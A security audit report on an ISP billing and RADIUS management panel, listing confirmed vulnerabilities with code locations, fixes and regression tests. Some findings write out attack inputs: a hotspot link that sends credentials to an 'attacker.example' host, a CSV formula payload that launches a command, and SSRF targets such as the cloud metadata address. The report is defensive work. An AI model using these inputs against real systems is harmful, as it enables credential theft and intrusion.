# JOINTBOX SECOND RED-TEAM AUDIT

**Date:** 2026-09-13 · **Scope:** `jointbox-isp-crm-panel` (NestJS backend, Next.js frontend, FreeRADIUS + PostgreSQL, PM2 deploy) · **Method:** full source forensics; no live prod execution
**RoutingNMS was NOT touched.**

Every claim below is labeled one of:
- **VERIFIED** — provable from source (file:line quoted; no speculation)
- **UNPROVEN** — code implies it but no evidence (usually needs a running system)
- **REQUIRES EXECUTION** — needs a staging DB / live service / load test to prove

Scale/readiness claims such as "enterprise ready" are NOT made anywhere in this document. No benchmark evidence exists in the repo (see §7).

---

## 1. VERDICT LEGEND & TOP LINE

**Jointbox is NOT secure-by-default or tenant-safe-by-default today.** Seven CRITICAL-class and ~twenty HIGH/MEDIUM-class findings were confirmed from source. The failure modes cluster in four places:

1. **Unsigned payment webhook** — anyone can mint paid invoices (money creation).
2. **Public API v1 + fail-open role matrix + ~40 unscoped operator routes** — cross-tenant access and mutation.
3. **SSRF guard exists but is wired to only 2 of ~10 outbound surfaces** — internal network reach.
4. **CSV/print injection + no security headers + JWT in localStorage/URLs** — operator-machine compromise and session theft.

Positive controls (verified, so they can be excluded going forward): MikroTik protocol framing is injection-proof; CoA TLVs are length-prefixed; `shell:true` appears nowhere; the `src/gateway` webhook path (Stripe/Paystack/Razorpay) verifies signatures, timestamps and amounts; audit-log writes have no in-app tamper path; migrations are additive; the FreeRADIUS + RADIUS DB path is CRM-independent.

---

## 2. SECTION A — CONFIRMED VULNERABILITIES (with D–L fields)

All findings below are VERIFIED from source unless marked. Fields per finding: **D** exploit path · **E** severity · **F** business impact · **G** evidence · **H** exact code location · **I** fix · **J** regression test · **K** migration strategy · **L** rollback strategy.

### A1. CRITICAL — Unsigned webhook marks invoices PAID (money creation)
- **D:** Attacker POSTs to the public endpoint `/payment-gateways/portal/webhook/:provider` with body `{reference: <known ref>, status: SUCCESS / pp_ResponseCode: "000"}`. `verifySignature` is a stub returning `{ok:true}` in all environments, so no signature is checked; the handler flips the transaction, creates a Payment and marks the invoice PAID inside a `$transaction` using the locally recorded `tx.amount` — the gateway-reported amount/currency is never compared. References `JT-<millis>-<3 hex bytes>` (~16.7M/min space) are exposed in checkout form fields and via the unauthenticated `publicStatus` poll.
- **F:** Free service for any attacker who can guess/observe a reference; audit trail shows a "paid" invoice that never received money; unreconcilable ledger.
- **G:** `verifySignature` unconditional `ok` — `backend/src/payment-gateways/payment-gateways.service.ts:237-245` ("TODO: implement per-provider signature checks" in the production branch); no amount check — `:183-231`; `isSuccessStatus` — `:247-261`; public route — `payment-gateways.controller.ts:46-49`; reference entropy — `service.ts:64`; unauth status poll — controller `:52-55`.
- **H:** `backend/src/payment-gateways/{payment-gateways.controller.ts:46-55, payment-gateways.service.ts:64,176-261}`
- **I:** Implement per-provider HMAC verification over raw bodies (as `src/gateway/gateway.service.ts:566-626` already does): constant-time compare, timestamp freshness (≤5 min), event-id dedupe (unique constraint), amount+currency equality vs `tx.amount`, audit log line, reject unless verified — **no financial side effect before verification** (verification-phase Priority 3).
- **J:** `backend/src/payment-gateways/webhook-signature.spec.ts` — valid sig settles, invalid sig rejects with 401 and no row, replayed event idempotent, stale timestamp rejected, wrong amount rejected.
- **K:** Ship signature verification behind per-provider config; keep current behavior only for a `WEBHOOK_INSECURE=1` dev flag that CI forbids in prod.
- **L:** Revert = re-enable flag; reconcile affected invoices manually from gateway portal exports.

### A2. CRITICAL — Public API v1 is a cross-tenant open door for any scoped API key
- **D:** A reseller's read key hits `GET /api/v1/lookup/phone/:phone`, `/lookup/username/:username` (returns any tenant's subscriber + balance), `GET /invoices/:id/pdf`, `GET /gateways/transactions`, `GET /nas`, `GET /areas`, `GET /fiber/*`. A write key: `POST /subscribers/:id/disconnect`, `/bandwidth`, `POST /invoices`, `/invoices/:id/payment`. Handlers call services/bare Prisma with **no owner/tenant parameter**.
- **F:** Total tenant confidentiality breach; arbitrary subscriber disconnect/bandwidth change and invoice forgery via a leaked or legitimately-issued reseller API key.
- **G:** `public-api.controller.ts:118-122,124-131,148-152,163-195,204-224,235-262,271-287,298-339`; corroborating unscoped signatures `invoices.service.ts:99,117,128,205,254,294`; `coa.service.ts:90`; bare `prisma.nas.findMany`/`prisma.area.findMany`. Key auth only sets `req.user = {sub, role:'API'}` — `api-key.guard.ts:46`; PermissionsGuard NOT applied on `/api/v1`.
- **H:** `backend/src/api-key/api-key.guard.ts:46`; `backend/src/public-api/public-api.controller.ts` (all listed routes)
- **I:** Every `/api/v1` handler must receive `actor` (from key owner) and run `scope.assert*`/tenant-filter exactly like the operator surface; forbid cross-tenant primitives (findFirst by phone/username must be restricted to the owner's subtree); add `@RequireScope` + matrix enforcement for API role; CI ratchet asserting no key-routed handler lacks an actor.
- **J:** `backend/src/api-key/cross-tenant-api.spec.ts` — seeded Tenant A + Tenant B, key of A against B's subscriber/invoice/nas/fiber endpoints → assert 403/404 for all.
- **K:** Add actor params to services; behavior unchanged for owner-scoped calls.
- **L:** Revert commit; endpoint gated behind feature flag while migration completes.

### A3. CRITICAL — Hotspot captive-portal credential exfiltration
- **D:** Attacker sends victim `https://panel/hotspot?link-login-only=https://attacker.example/steal`; victim redeems a valid scratch card; response contains generated `username/password`; a hidden `<form method="post" action={loginUrl}>` auto-submits both credentials to the attacker origin (no origin validation, auto-submit at `page.tsx:77`).
- **F:** Scratch-card credential theft → account takeover of redeemed sessions; phishing via a legit-looking panel URL.
- **G:** `frontend/app/hotspot/page.tsx:64-72` (query param → state), `:77` (auto-submit), `:228-232` (hidden form with credentials).
- **H:** `frontend/app/hotspot/page.tsx:64-72,77,228-232`
- **I:** Allowlist the form action origin — only the router host/IP returned by the backend (or configured router origin) may be posted to; never auto-submit to a foreign origin. Prefer a signed `redirect` token issued by `/public/hotspot/redeem`.
- **J:** `frontend/e2e/hotspot-login-url.spec.ts` — foreign `link-login-only` host ⇒ no form rendered, no submit.
- **K:** Hard-denylist change; no data migration.
- **L:** Revert the redirect-allowlist code.

### A4. HIGH — SSRF: Discord/webhook alert channels bypass the guard entirely (+ probe oracle)
- **D:** Authenticated user (any role under the fail-open matrix) sets `channel` to `http://127.0.0.1:5432/...` or an internal service; `postDiscord` does a raw `fetch(url)` with default redirect-following; `testMyChannel` fires it and returns `{sent}`, and `sendToUser` auto-fires on scoped alerts — internal port/service oracle + payload delivery into internal services.
- **F:** Internal network scanning from the panel; alert payloads (which can contain PII) delivered to attacker-chosen internal or external hosts; webhook-URL phishing.
- **G:** `notifications/alerts.service.ts:73-92` (no validation on create), `:142-166` (raw fetch, redirect-follow), `:107-121`; `notifications.controller.ts:73-82` (testMyChannel). The centralized guard (`security/outbound-guard.ts`) is imported **only** by `diagnostics.service.ts:7,64` and `webhooks.service.ts:7,87,114,226`.
- **H:** `backend/src/notifications/alerts.service.ts:73-92,107-166`; guard wiring — `backend/src/security/outbound-guard.ts` + 2 call sites.
- **I:** Route all outbound ops through `assertDestination(url, 'EXTERNAL')` (guard already refuses loopback/link-local/metadata/IPv4-mapped/decimal/hex/octal and re-validates on redirect); persist only validated URLs; drop or gate `testMyChannel`.
- **J:** `backend/src/notifications/alerts-channel-ssrf.spec.ts` — create with `http://169.254.169.254/latest/meta-data`, `http://127.0.0.1:6379`, `http://[::ffff:127.0.0.1]:80`, decimal/hex/octal forms → all rejected; `testMyChannel` blocked.
- **K:** Validate at write-time; existing rows re-validated on first send.
- **L:** Revert validation; no schema change.

### A5. HIGH — SSRF: syslog forward targets and SNMP discovery are unguarded
- **D:** ISP-role actor saves forward target `host: 127.0.0.1`, `port: 5432` (regex allows loopback, no guard) → `net.createConnection({host, port})` / UDP dial at syslog-event rate; SNMP `discover` has no host validation (unlike `testDevice`) and probes arbitrary `host:port` over UDP.
- **F:** Internal TCP/UDP reachability + payload injection into DB/Redis/app ports; monitoring discovery used as a scan primitive.
- **G:** `ndm.service.ts:844-865` (saveForwardTarget), `syslog-receiver.service.ts:295,305-309` (raw dial); `ndm.service.ts:142-171` (discover, no regex), `:173-224` (create stores any ip). Guard profile comment names syslog forwarding as a consumer (`outbound-guard.ts:36`) but it is not wired.
- **H:** `backend/src/ndm/{ndm.service.ts:142-224,844-865, syslog-receiver.service.ts:290-315}`
- **I:** Wire `assertDestination(host, 'OPERATOR_NETWORK')` for syslog forward targets and SNMP/NDM create; forbid loopback in all profiles (guard default).
- **J:** `backend/src/ndm/forward-target-ssrf.spec.ts` + `backend/src/ndm/snmp-discover-ssrf.spec.ts`.
- **K:** Validate on write; block existing loopback rows on read.
- **L:** Revert validation.

### A6. HIGH — Authorization is not complete and not enforced uniformly (cross-tenant family)
- **D:** Reseller JWT reaches: whole-platform ledger `GET /accounting/ledger-summary|trial-balance|cashflow`; `POST /invoices`, `/invoices/:id/pdf`, `/invoices/:id/payment`, `/invoices/subscriber/:subscriberId`; tickets create/update/sla-backfill (mutates SLA timers platform-wide); `POST/PATCH/DELETE /payments/:id`; `GET /billing-ext/pro-rata`, `/subscriber-balance/:id`, `/subscriber-ledger/:id` (any subscriber's balance/ledger); `POST /boost/apply`; `POST /gateway/initiate/:invoiceId/:gateway`; `POST /network/duplicate-sessions/sweep` (all tenants); `/ip-pools/sync/apply` (all routers); `POST /static-ips[/range]` with arbitrary nasId; `POST /communication/send`; outage classify/notify; `GET /security/sessions` (all sessions) and `DELETE /security/sessions/:id` (any).
- **F:** Multi-tenant data exposure (financial + PII), cross-tenant mutation, SMS/email spend abuse, session management takeover; fresh deployments are worse because the role matrix **fails open**: a role with zero RolePermission rows is unrestricted (`permissions.guard.ts:135`).
- **G+H (representative):**
  - `accounting.service.ts:148,181,282` (unscoped ledger reads)
  - `invoices.service.ts:99,117,128,205,254,294` (create/pdf/payment/findBySubscriber unscoped)
  - `tickets.service.ts:55-152` (unscoped CRUD + slaBackfill)
  - `payments.controller.ts` + `payments.service.ts:184` (recordPayment no tenant check)
  - `billing-ext.service.ts:21,27,147,191,199` (balance/ledger by id)
  - `boost` controller+service (apply/active/revert unscoped)
  - `network.controller.ts:65-68` (sweep), `ip-pool.controller.ts:32-35` (sync/apply)
  - `static-ip.controller.ts:60-69`, `static-ip.service.ts:173-229`
  - `notifications.controller.ts:97-146` (communication)
  - `outages.controller.ts:40-94`
  - `security.service.ts:563-580` (sessions list/kill)
  - `auth.controller.ts:25` (`POST /auth/impersonate/:userId` J-only; `users.switchProfile` deny never checked)
  - fail-open: `permissions.guard.ts:135`
- **I:** (a) Make `permissions.guard.ts` **fail closed** — unconfigured role ⇒ deny non-floor routes (or refuse boot until matrix seeded); (b) actor-fy every listed handler with `scope.assert*` + tenant-filtered queries (target matrix from `backend/src/security/authorization-matrix.ts` + its spec); (c) enforcement esp. for the 9 bulk routes named in `authorization-matrix.spec.ts` (sweep, sync/apply, outage notify, communication send, bulk invoices/payments, etc.); (d) wire impersonation through the delegation matrix.
- **J:** `backend/src/security/cross-tenant-e2e.spec.ts` + `backend/src/security/bulk-routes.spec.ts` — see Verification §"behavioral tenant-isolation tests" and "bulk authorization tests".
- **K:** Two commits: fail-closed matrix first (fast), then per-route scoping (slower) — verify no operator function regresses.
- **L:** Revert fail-closed commit if a legit function breaks; audit list serves as regression suite.

### A7. HIGH — `prisma db push --accept-data-loss` reachable from tracked, npm-script-reachable paths (Verification Priority 1)
- **D:** `npm run db:push`/`db:setup` → `scripts/db-push-safe.js` passes `--accept-data-loss`; production updater `update-jointbox.sh:79-81` falls back to bare `prisma db push` when `migrate deploy` fails — migration-history bypass on a production DB; failed migrations do not stop the update.
- **F:** Silent destructive schema change / data loss on prod; a bad migration is papered over instead of failing the deploy.
- **G:** `backend/scripts/db-push-safe.js:14`; `backend/package.json:14,16`; `update-jointbox.sh:79-81`; mitigation exists: CI greps `--accept-data-loss` (`ci.yml:70-74`) and the safe path is `scripts/db-deploy.sh:29-37` ("Never use prisma db push here").
- **H:** `backend/scripts/db-push-safe.js`, `backend/package.json:14,16`, `update-jointbox.sh:79-81`
- **I:** Remove the flag from the unattended path entirely (A failed migration MUST fail the deployment); delete the bare `db push` fallback in `update-jointbox.sh` (exit 1 + safe stop); keep `migrate deploy` as the only prod path.
- **J:** `backend/src/common/db-push-safety.spec.ts` — asserts no `--accept-data-loss` string in tracked scripts/package.json and that `update-jointbox.sh` exits non-zero when `migrate deploy` fails.
- **K:** None needed (no schema change).
- **L:** Re-add script only behind explicit `--danger` flag documented for dev.

### A8. HIGH — Auto-renewal wallet deduction is not atomic with service extension
- **D:** Crash between wallet debit and invoice/service writes leaves the wallet debited with **no invoice, no service**; BullMQ retry (`attempts:3`) hits `alreadyDeducted` → subscriber marked **SKIP, not FAIL** — money gone, customer silently stays expired.
- **F:** Overt customer harm (charged for nothing) and support load; financial ledger and subscriber state diverge.
- **G:** `billing.service.ts:250-296` — `deductBalance` commits its own `$transaction` (:250) then invoice (:260), payment (:276), service expiry (:289), ACTIVE (:293) as separate writes; `alreadyDeducted` handling `:251-254`; queue `attempts:3` `queue.service.ts:206-210`. The correct pattern already exists: `activateRenewal` single `$transaction` — `subscribers.service.ts:3369-3544`.
- **H:** `backend/src/billing/billing.service.ts:250-296`
- **I:** Reuse the `activateRenewal` transactional shape: wallet debit + invoice + payment + service state in one `$transaction`; on retry, resume (idempotency key) instead of skip.
- **J:** `backend/src/billing/auto-renewal-atomicity.spec.ts` — force failure between debit and invoice; assert re-run completes service, no double charge.
- **K:** Code-only refactor; behavior preserved.
- **L:** Revert commit; reconcile affected subscribers from BalanceTransaction.

### A9. HIGH — `billing-ext.reverseInvoice` bypasses every financial control
- **D:** Staff-facing reversal with no ledger post, no commission clawback, no period-open check; `refundedAmount` stays 0 and `paidAmount` untouched (reports read stale state); refund credited to a wallet no spending path draws on ("two-wallet" divergence, see A13); if subscriber deleted the refund is **silently skipped**.
- **F:** Books understate refunds; commissions remain booked; closed periods can be reversed into; customers lose refunds silently.
- **G:** `billing-ext.service.ts:327-431` (reversal), `:378-388` (state), `:406-426` (wallet credit + null-skip); contrast accounting's correct `reverseInvoice` `accounting.service.ts:576-600` + `refundPayment` clawback `:687-705`; no `assertPeriodOpen` on this path.
- **H:** `backend/src/billing-ext/billing-ext.service.ts:327-431`
- **I:** Route reversals through `AccountingService.reverseInvoice` (ledger + clawback + period-lock + idempotency `originalInvoiceId @unique`); delete the parallel implementation.
- **J:** `backend/src/billing-ext/reversal-integrity.spec.ts` — assert ledger rows, clawback, period rejection, deleted-subscriber still refunded to a reconcilable account.
- **K:** Merge services; keep unique constraint.
- **L:** Revert to parallel path behind flag.

### A10. HIGH — CSV formula injection (export layer, operator machines)
- **D:** Subscriber name/phone (attacker-controlled via public `POST /portal/register`) exported via `csvDownload` → cell `=HYPERLINK(...)` / `=cmd|'/c calc'!A0` executes in Excel/LibreOffice. Six hand-rolled CSV writers skip the app's own `csvSafe` hardening.
- **F:** Code execution / formula abuse on operator workstations; phishing and spreadsheet data theft; a proven attack class the codebase already defends against elsewhere (`app/components/csv-safe.ts`).
- **G:** `dashboard/page.tsx:132-151` (`csvDownload`, no csvSafe), called `:1059`; unhardened writers `accounting/page.tsx:332-339`, `reversals/page.tsx:84-94`, `earnings/page.tsx:32-44`, `accounting/margin-chain.tsx:78-102`, `accounting/profit-report.tsx:49-60`, `reports/page.tsx:65-78`; correct reference `components/csv-safe.ts:2-45`, `components/csv-export.ts:17`, `components/export-file.ts:51`; attacker input path `portal.controller.ts:110-116` (public register).
- **H:** `frontend/app/dashboard/page.tsx:132-151,1059` + the five other writers.
- **I:** Route all six through the single `csvSafe`-backed builder (`export-file.ts`); prefix `'` on cells starting `^[=+\-@\t\r]`.
- **J:** `frontend/tests/csv-formula-injection.test.ts` (extend `tests/csv-safe.test.ts`) covering `=1+1`, `+1+1`, `-1+1`, `@SUM(`, `=HYPERLINK(`; plus a manual Excel/LibreOffice open-cycle (REQUIRES EXECUTION).
- **K:** No data migration; output-layer change.
- **L:** Revert CSV builder change.

### A11. MEDIUM-HIGH — No CSP / frame protection / Referrer-Policy / nosniff; clickjacking + no XSS containment
- **G:** `frontend/next.config.ts:19-30` — only cache headers; repo-wide grep for CSP/X-Frame-Options/frame-ancestors/HSTS/nosniff/Referrer-Policy → 0 hits.
- **D:** Any origin can frame the panel (forced-click on delete/reverse/impersonate); no CSP containment for the A12 sink or future sinks; panel paths leak in Referer to external hosts.
- **F:** Session-hijack via clickjacking, and every XSS finding's impact multiplied (no CSP).
- **H:** `frontend/next.config.ts:19-30` (+ TLS terminator if present — UNPROVEN)
- **I:** Add `Content-Security-Policy` (`default-src 'self'`), `X-Frame-Options: DENY`, `frame-ancestors 'none'`, `Referrer-Policy: same-origin`, `X-Content-Type-Options: nosniff`, HSTS.
- **J:** `frontend/e2e/security-headers.spec.ts` (assert headers on `/`, `/login`, `/dashboard`).
- **K/L:** Header-only; revert = remove headers.

### A12. MEDIUM — `document.write` HTML injection in print exporter (latent stored XSS)
- **G:** `dashboard/page.tsx:153-164` — unescaped `String(v ?? "")` into `<td>` inside `window.open().document.write()`. Current caller passes only numeric metrics; any future caller passing subscriber names (as `csvDownload` already does below it) turns a portal-registered string into same-origin HTML in the child window; child has `window.opener` → reads parent `localStorage['token']`.
- **H:** `frontend/app/dashboard/page.tsx:153-164`; token storage `services/auth.service.ts:22-24`.
- **I:** Never interpolate into HTML; escape via textContent-style helpers or render via React `createPortal`.
- **J:** `frontend/tests/print-window-escape.test.ts`.

### A13. MEDIUM — Two parallel subscriber wallets that disagree
- **G:** `Subscriber.balance` + `BalanceTransaction` (spent by auto-renewal/billing) vs `SubscriberBalance.balance` + `SubscriberBalanceLedger` (only consumer: billing-ext; `reservedBalance` never written; history `onDelete: Cascade`). Refund asymmetry → money sits in a wallet nothing draws on → customer charged twice for one period.
- **H:** `backend/prisma/schema.prisma:612,2818,2826`; `billing-ext.service.ts:216-431`
- **I:** Pick one wallet per money flow; reconcile balances; make refunds land in the wallet the billing engine actually deducts.
- **J:** `backend/src/billing/wallet-reconciliation.spec.ts`.

### A14. MEDIUM — Session design: stateless JWT, logout is cosmetic, refresh bypasses blacklist, per-process state
- **G:** `auth.service.ts:219-248` — `POST /auth/refresh` mints a new 7-day token from the current one *without consulting the blacklist*; blacklist is a per-process `Set` (`token-blacklist.service.ts`) — under a 2-worker PM2 cluster a logged-out token still works on the other worker; `main.ts:104` `trust proxy = 1` lets a directly-exposed install spoof XFF and bypass the 600/min limiter and 8-fail lockout.
- **H:** `backend/src/auth/auth.service.ts:219-248`; `backend/src/auth/token-blacklist.service.ts`; `backend/src/main.ts:104,114-142`; lockout `auth.service.ts:27-46`
- **I:** Redis-backed revocation (verify worker on every request or short-TTL JWT + refresh rotation); logout must revoke the refresh family; pin `trust proxy` to 1 only behind the known proxy (or validate XFF chain).
- **J:** `backend/src/auth/refresh-revocation.spec.ts`, `backend/src/auth/xff-bypass.spec.ts`.
- **K:** See Verification §"frontend auth migration plan" (cookie migration, refresh rotation, multi-device).
- **L:** Feature-flag Redis revocation; fall back to legacy.

### A15. MEDIUM — JWT in URL query strings (3 SSE call sites) + localStorage JWT (191 sites)
- **G:** `frontend/app/components/use-sse.ts:60`, `subscribers/[id]/context.tsx:270`, `nas/[id]/context.tsx:290` — token in `?token=`; token write `services/auth.service.ts:22-24`; 191 localStorage read/write sites.
- **H:** `frontend/app/components/use-sse.ts:60`, `frontend/app/subscribers/[id]/context.tsx:270`, `frontend/app/nas/[id]/context.tsx:290`, `frontend/services/auth.service.ts:22-24`
- **I:** Ephemeral one-shot SSE ticket or httpOnly cookie; full cookie migration plan per Verification §12 (+ regression `frontend/tests/`. see A12/A14 regression list).
- **K:** AUTH-COOKIE-MIGRATION.md design already exists per `app/middleware.ts:33-37`.

### A16. MEDIUM — CoA/Disconnect is single-shot; suspensions can stay live up to 24 h
- **G:** `radius-coa.ts:131-134` — one UDP datagram, 5 s timeout, one attempt, no queue/retry (MikroTik API fallback exists in `network.service.ts:151-210`); `network-logs.service.ts:531-543` closes stale rows at 15 min but relies on interim updates (60 s interval) — a router that ignores CoA leaves the session billed/active until the janitor catches it; suspend/delete does not force a router-side disconnect.
- **H:** `backend/src/network/radius-coa.ts:123,131-134`; `backend/src/network/network.service.ts:151-210`
- **I:** Retry CoA with exponential backoff + verify via `/ppp/active/print`; escalate to API disconnect; audit the 24h window.
- **J:** `backend/src/network/coa-retry.spec.ts`.

### A17. MEDIUM — Docker deployment ships no RADIUS daemon
- **G:** `deploy/docker-compose.yml` + `deploy/backend.Dockerfile` include no FreeRADIUS service/daemon; `scripts/setup-freeradius.sh` is bare-metal-only. A compose deploy therefore has NO auth path (RADIUS = "CRM down" everywhere).
- **H:** `deploy/docker-compose.yml`, `deploy/backend.Dockerfile`
- **I:** Either add a freeradius container (shared PG) or document compose as non-auth topology with a hard fail in health check.
- **J:** deploy smoke test: auth packet answered after compose up.

### A18. MEDIUM — Money layer splits beyond the ledger (settlements outside double-entry) + advisory period lock + missing dedupe keys
- **G:** `settleActivation` (reseller wallet margin) writes `UserBalanceTransaction` + `ProfitEntry` but **no `LedgerEntry`** (`reseller-pricing.service.ts:1667-1730`); `deductBalance` posts ledger outside its own tx branch (`accounting.service.ts:514-569`); `assertPeriodOpen` missing on cron/activation/topup paths (`billing.service.ts:132-146,250-286`; `accounting.service.ts:470-486`; reseller-pricing/topup); `LedgerEntry.post()` has no dedupe key (`accounting.service.ts:43-78`); `reverseActivation` looks for legacy ref `SUB#<id>:RENEWAL` that nobody writes (`reseller-pricing.service.ts:1167-1187`); two concurrent partial refunds can double-clawback commissions (`accounting.service.ts:692-693` check outside lock).
- **H:** `backend/src/accounting/accounting.service.ts:43-78,465-570,602-712`; `backend/src/organization/reseller-pricing.service.ts:1160-1241,1460-1567,1596-1667,1667-1730`
- **I:** Post ledger from `settleActivation`; move ledger post inside the tx; add `assertPeriodOpen` at all money boundaries; dedupe key on `LedgerEntry`; fix reverse refs; move the clawback check inside a lock.
- **J:** `backend/src/accounting/period-lock.spec.ts`, `backend/src/accounting/commission-clawback-race.spec.ts`, `backend/src/accounting/settlement-ledger.spec.ts`.
- **K:** Backfill ledger rows for existing settlements in a guarded migration (idempotent, no double-post).

### A19. MEDIUM — Rate limiting and DoS surface
- **G:** No body limit (`main.ts` — Nest 100 kb default, not explicit); `POST /subscribers/import` and `/import/panel` **unbounded** (`subscribers.service.ts:3632,3740`); `POST /monitoring/targets/import`; `bulkSend` silently truncates at 10k (`notifications.service.ts:165-169`); global limiter is per-process (`main.ts:114-142`) and bypassable via XFF (A14); Redis-backed guard only on hotspot redeem (`hotspot.controller.ts:33`).
- **H:** `backend/src/main.ts:114-142`; `backend/src/subscribers/subscribers.service.ts:3632,3740`; `backend/src/notifications/notifications.service.ts:165-169`
- **I:** Explicit `json({limit})` + pagination caps (the `pagination.ts` helper exists), import chunk caps, Redis-backed per-IP/per-user limits on expensive endpoints (login, import, export, reports, sweep, sync).
- **J:** `backend/src/common/dos-surface.spec.ts` + staging load suite (Verification §8).

### A20. MEDIUM — Deploy defaults are public knowledge
- **G:** `deploy/docker-compose.yml:11,35-38` — `zalpass123`, `JWT_SECRET: change-me-in-production-please`; `deploy/scripts/backup.sh:14` + `deploy/install-ubuntu.sh:13` — `jointbox123`; `SETUP.md:41`, `SCALING.md:76`.
- **H:** `deploy/docker-compose.yml:11,35-38`; `deploy/scripts/backup.sh:14`
- **I:** Generate random secrets at install/first-boot; fail boot on placeholder values (like `validateEnv` already does for JWT_SECRET/ADMIN_PASSWORD — `main.ts:57-69`).
- **J:** deploy synth test asserting no placeholder secrets in generated config.

### A21. MEDIUM — Backup posture: unencrypted, no PITR, RPO 24 h, no restore drill
- **G:** nightly `pg_dump -Fc` + 14-day retention + offsite upload cmd (`backup.service.ts`), but no encryption, no WAL archiving (`postgresql-jointbox.conf:30` sets `wal_level = replica` with no `archive_command`, no standby docs), `synchronous_commit = off`; `deploy/scripts/backup.sh` plain gzip dump with hardcoded fallback connection string.
- **H:** `backend/src/common/backup.service.ts`; `deploy/scripts/backup.sh:14`; `deploy/tuning/postgresql-jointbox.conf:30`
- **I:** Enable WAL archiving + encryption (pgcrypto/AES or offsite TLS), define RPO/RTO, automated restore-verify job.
- **J:** `deploy/tests/restore-drill.sh` (REQUIRES EXECUTION on staging).

### A22. MEDIUM — 2FA TOTP secret stored unencrypted; `/uploads/*` static route unauthenticated
- **G:** `twoFactorSecret` column (schema) plaintext at rest; `main.ts:208-211` serves uploaded CNIC/profile images without auth (filename predictability).
- **H:** `backend/prisma/schema.prisma` (Subscriber 2FA fields); `backend/src/main.ts:208-211`
- **I:** Encrypt TOTP secrets via SecretsService; protect uploads behind auth or opaque signed URLs.
- **J:** `backend/src/common/upload-access.spec.ts`.

### A23. LOW/INFO — misc confirmed
- Git-branch command substitution: `app.controller.ts:575` unquoted `gitBranch` in `git fetch` (needs repo write) — fix: `execFile` arg array.
- `billing-ext` negative top-up accepted (`if (!body?.amount)` — `billing-ext.service.ts:216-227`) — validate `> 0` + row-lock.
- Output of webhook delivery (`webhooks.service.ts:249`) is attacker-controlled text stored and rendered — escape on render (Track A clean-pattern applies).
- SSE bus has no tenant scoping (`events.service.ts:39-42`) — INFO.
- `users.service.ts:1177-1210` balance helpers are TOCTOU-readable and ledgerless — no callers found; delete or fix.
- `uploaded image url` cross-origin in `<img>` without `referrerpolicy` (`components/image-upload.tsx:10-14`) — LOW.
- Dead `lib/axios.ts`/`lib/api.ts` clients would send tokens over HTTP:3001 if re-imported — delete.
- 2FA self-disable flow, `GET /security/sessions` whole-listing (A6a) — MEDIUM boundary.

---

## 3. SECTION B — NEW VULNERABILITIES (this pass only; not in batch-1)

- B1 **Unsigned portal webhook → paid invoices** (A1) — batch-1 never examined `payment-gateways` (it reviewed only `src/gateway`).
- B2 **Public API v1 cross-tenant hole** (A2) — matrix spec's "API role" gap; behavioral proof.
- B3 **Hotspot credential exfiltration** (A3) — frontend was not audited at all in batch-1.
- B4 **Alert-channel SSRF + oracle** (A4), **syslog/SNMP SSRF** (A5) — guard existed but wiring was never checked.
- B5 **Fail-open role matrix** (A6-a) — the default "unconfigured role = unrestricted" posture.
- B6 **Auto-renewal crash window** (A8) — batch-1 checked `activateRenewal`, not `runAutoRenewal`.
- B7 **CSV injection + document.write** (A10/A12) — frontend export layer unaudited.
- B8 **Bankbook split (settlements outside ledger, two wallets, advisory period lock)** (A13/A18).
- B9 **Refresh-after-logout + per-process blacklist + XFF bypass** (A14).
- B10 **CoA single-shot / 24 h suspension window / no FreeRADIUS in docker** (A16/A17).
- B11 **Deploy default secrets + backup posture** (A20/A21) — deploy assets never reviewed.

## 4. SECTION C — PREVIOUSLY UNAUDITED AREAS (now covered)

Batch-1 delivered: authorization-matrix scaffold (+spec), queue guardrails, SSE auth guard, unbounded-query ratchet (18 baseline, wired into CI), rate-limit guard, backup introspection, audit interceptor, demo isolation. It did **not** cover, and this pass now does:

| Area | Batch-1 | This pass |
|---|---|---|
| Frontend app/ (XSS, CSV, headers, tokens, hotspot, middleware) | unaudited | A3, A10, A11, A12, A15 (+ clean-category proof) |
| Webhook signature enforcement (`payment-gateways`) | only `src/gateway` | A1 (broken), contrast A: `gateway` signed |
| Public API v1 tenant scoping | unknown | A2 (cross-tenant) |
| Whole operator route surface (58 controllers) | scaffold only | A6 (route matrix + gaps) |
| SSRF guard wiring across all outbound ops | guard built | A4, A5 (only 2/10 call sites wired) |
| Billing invariances (renewals, refunds, wallets, ledger split) | partial | A8, A9, A13, A18 |
| RADIUS/FreeRADIUS topology + failure modes | not examined | A16, A17 + §6 |
| Migrations forensics + `db push` exposure | not examined | A7 + §6 |
| Deploy assets, secrets, defaults, backup/DR | partial | A20, A21 + §6 |
| Audit-log tamper surface | write path only | §5 (verified with grep) |
| Scale/benchmark evidence | none | §7 (UNPROVEN) |

## 5. AUDIT LOG INTEGRITY — VERIFIED (positive)

Global `APP_INTERCEPTOR` (`common/audit.interceptor.ts`) logs POST/PUT/PATCH/DELETE with actor/action/entity/traceId/ip/UA; grep across `backend/src` for `activityLog.update|updateMany|delete|deleteMany` = **0 matches** (43 create/findMany/count only) — no in-app edit/erase path for the trail. Residual: DB superuser can delete rows (out of app control); **no retention policy** (tables grow forever — bigint migration buys headroom, not policy). `trust proxy = 1` also lets a directly-exposed install falsify audit IPs (A14).

## 6. FAILURE-ENGINEERING POSITION (VERIFIED from code)

- **RADIUS topology:** FreeRADIUS (UDP 1812/1813) shares one PostgreSQL with the CRM but is not part of the NestJS process. CRM down ⇒ auth/accounting survive. **DB down ⇒ everything fails** (single shared PG). Redis down ⇒ production **refuses to boot** (`main.ts:235-248`, `cache.service.ts:19-23`) unless `REDIS_REQUIRED=false`; RADIUS unaffected. NAS down ⇒ reconcile skips unreachable routers; stale-session janitor closes at 15 min.
- **Accounting dedupe:** `acctuniqueid @unique` (schema.prisma:299) — duplicate/out-of-order packets are constrained, not logic-only.
- **CoA:** single shot (A16). **Queues:** BullMQ `attempts:3` + backoff; **no dead-letter queue, no job idempotency keys**; `JobsService` drain is serial, no per-job timeout, RUNNING reclaimed only at boot — a poisoned job stalls the drain (batch-1 delivered guard options; enforcement still Partial).
- **Scheduled jobs:** single-primary via `isPrimaryInstance()` + `CronGuardService` unregister non-primary crons — VERIFIED.
- **Scale claims:** **UNPROVEN**; no load-test artifacts exist. 10k–1M stages cannot be claimed without execution.
- **RADIUS-on-CRM independence goal:** VERIFIED for CRM-down / frontend-down / Redis-down; **DB single point** and **docker topology missing FreeRADIUS** are the two gaps to close before the goal holds in all topologies.

## 7. SCALE & EVIDENCE STATUS

| Claim | Status |
|---|---|
| "10M subscriber ready" | **UNPROVEN / REQUIRES EXECUTION** — no benchmarks, no synthetic datasets |
| RADIUS auth N/sec | **REQUIRES EXECUTION** (freeRADIUS bench, staging) |
